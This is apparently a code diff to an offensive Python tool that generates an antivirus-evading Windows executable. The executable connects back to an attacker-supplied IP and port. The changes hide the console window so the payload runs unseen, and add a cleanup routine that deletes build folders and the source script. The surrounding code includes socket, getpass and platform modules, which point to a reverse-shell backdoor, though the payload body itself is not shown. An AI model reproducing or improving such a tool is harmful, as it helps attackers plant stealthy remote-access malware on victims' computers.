@@ -1,10 +1,11 @@
 
 # -*- coding: utf-8 -*-
 
+
 #This simple python script to evade antiviruses on fully patched and updated Windows environments using a python then converted exe payload.
 #Created by @0xCyberY
 
-import base64, sys
+import base64, sys, os, shutil
 import argparse
 import textwrap 
 from distutils.core import setup
@@ -52,10 +53,19 @@ def Setup():
         name = 'CyberY',
         description = 'python to exe payload',
         version = '1.0',
-        console=['CyberY.py'],
+        #console=['CyberY.py'],#remove black screen (python console)
+        windows = [{'script': "CyberY.py"}],
         options = {'py2exe': {'bundle_files': 1,'packages':'ctypes','includes': 'base64,sys,socket,struct,time,code,platform,getpass,shutil',}},
         zipfile = None,
         )
+
+def Clean_up():
+        if (os.path.exists("./dist/CyberY.exe")):
+            shutil.move("./dist/CyberY.exe", ".")
+            shutil.rmtree("./dist")
+            shutil.rmtree("./build")
+            os.remove("./CyberY.py")
+            print("Successful")
 
 # Banner
 def print_banner():
@@ -76,8 +86,7 @@ if __name__ == '__main__':
                 # create a command line interface.
                 parser = argparse.ArgumentParser(description='Antivirus Evasion Py2exe',
                 formatter_class=argparse.RawDescriptionHelpFormatter,
-                epilog=textwrap.dedent('''Example:\n\tC:\\>python aepy2exe.py -e py2exe -ip <ip_address> -p <port>\n\tC:\\>python aepy2exe.py -e py2exe -ip 192.168.1.10 -p 443'''))
-                parser.add_argument('-e', '--execute', type=str, help='execute py2exe')
+                epilog=textwrap.dedent('''Example:\n\tC:\\>python aepy2exe.py -ip <ip_address> -p <port>\n\tC:\\>python aepy2exe.py -e py2exe -ip 192.168.1.10 -p 443'''))
                 parser.add_argument('-ip', '--attacker_ip', default='192.168.1.10', help='specified attacker IP')        
                 parser.add_argument('-p', '--port', type=int, default=443, help='specified attcaker port')
                 args = parser.parse_args()
@@ -93,15 +102,14 @@ if __name__ == '__main__':
                 join = Con_cat( encoded )
                 # Call write dun. to write payload into file.
                 write_file(join)
-                # Delete all arguemunt except py2exe.
-                del sys.argv[1]
-                del sys.argv[2]
-                del sys.argv[3]
-                del sys.argv[2]
-                del sys.argv[2]
+                # Delete all arguemunts.
+                del sys.argv[1:]
+		# Append py2exe argument for Setup fun.
+		sys.argv.append("py2exe")
                 # Call setup fun. to convert pyton to exe.
                 Setup()
+                # Call Clean up fun.
+                Clean_up()
         except Exception as e:
                 # Print exception.
                 print( e )
-                
